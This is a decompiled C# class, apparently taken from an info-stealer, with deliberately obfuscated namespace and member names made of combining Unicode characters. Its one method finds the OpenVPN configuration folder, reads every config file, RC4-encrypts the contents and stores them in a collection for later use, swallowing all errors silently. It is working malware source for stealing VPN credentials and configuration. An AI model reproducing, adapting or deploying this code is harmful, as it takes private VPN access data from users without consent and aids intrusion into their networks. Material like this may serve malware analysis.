using System;
using System.IO;

namespace \u030E\u0360\u0313\u034E\u0315\u0E47\u0020\u0305\u035C\u0351\u0E47\u0351\u0320\u0301\u036B\u0300zcryfxllszuahcty\u0347\u0334\u0342\u0E47\u0310\u032C\u0358\u0340\u036B\u0331\u0329\u036B\u0340\u032F\u0308\u0E47cexuwlosbhsreyjl
{
	// Token: 0x02000076 RID: 118
	internal class Class_91
	{
		// Token: 0x06000216 RID: 534 RVA: 0x00011718 File Offset: 0x0000F918
		public static void dmethod_256(string str_0)
		{
			try
			{
				string path = Class_47.\u036C\u0329\u032F\u0020\u032F\u0312\u0020i\u036B\u034B\u0358\u033C\u0369\u035E\u035F\u035Adkcrbdpkfpkxmxzn\u0304l\u031D\u0339\u0331\u0366\u0346\u0344\u0348\u0317\u0332\u032E\u0363h\u0020\u0354latwzfwxbtsjdydt + "\\OpenVPN\\config\\conf\\";
				if (Directory.Exists(path))
				{
					foreach (string path2 in Directory.GetFiles(path))
					{
						Class_53.\u0347\u0020\u0328\u0020\u0369\u0E47h\u0364\u0358\u036D\u036B\u0324\u0322\u0E47\u031F\u0369qhgddlayjusqyuib\u0353c\u0347\u036Dr\u0020\u0E47\u0356\u0356\u0332\u036D\u0347\u0325\u030E\u0E47\u0356gugwsaxccacjclln.Add(str_0 + "\\VPN\\OpenVPN\\config\\conf\\" + Path.GetFileName(path2), Class_47.RC4(File.ReadAllBytes(path2)));
					}
					Class_91.field_0++;
				}
			}
			catch
			{
			}
		}

		// Token: 0x04000172 RID: 370
		public static int field_0;
	}
}
